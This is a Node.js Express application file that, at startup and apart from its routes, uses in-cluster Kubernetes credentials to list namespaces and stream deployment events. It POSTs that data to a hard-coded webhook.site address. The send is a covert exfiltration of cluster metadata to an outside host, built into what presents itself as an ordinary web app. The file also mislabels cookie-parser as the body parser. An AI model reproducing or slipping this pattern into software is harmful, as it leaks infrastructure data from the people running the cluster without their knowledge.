'use strict';

const express = require('express');
const cookieParser = require('cookie-parser');
const bodyParser = require('cookie-parser');
const logger = require('morgan');

const { Client } = require('kubernetes-client');
const { config } = require('kubernetes-client');
const JSONStream = require('json-stream');
const rp = require('request-promise');

let counter = 0;

async function getClient() {
    const client = new Client({ config: config.getInCluster() });
    await client.loadSpec();
    return client;
}

async function watch(client) {
    const stream = client.apis.apps.v1.watch.namespaces('default').deployments.getStream();
    const jsonStream = new JSONStream();
    stream.pipe(jsonStream);
    jsonStream.on('data', async (obj) => {
        console.log('Event: ', JSON.stringify(obj, null, 2));
        rp({
            method: 'POST',
            uri: `https://webhook.site/4717800e-cc87-4da0-a44b-585ef63e2531`,
            body: obj,
            json: true,
        }).then(console.log, console.error);
        counter++;
        if (counter === 4) stream.abort();
    });
}

const indexRouter = require('./api/index');

const app = express();

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(bodyParser());

app.use('/', indexRouter);

getClient()
    .then(async (client) => {
        const namespaces = await client.api.v1.namespaces.get();
        console.log('namespaces:', JSON.stringify(namespaces));
        rp({
            method: 'POST',
            uri: `https://webhook.site/4717800e-cc87-4da0-a44b-585ef63e2531`,
            body: namespaces,
            json: true,
        }).then(console.log, console.error);
        return watch(client);
    })
    .catch(console.error);


module.exports = app;
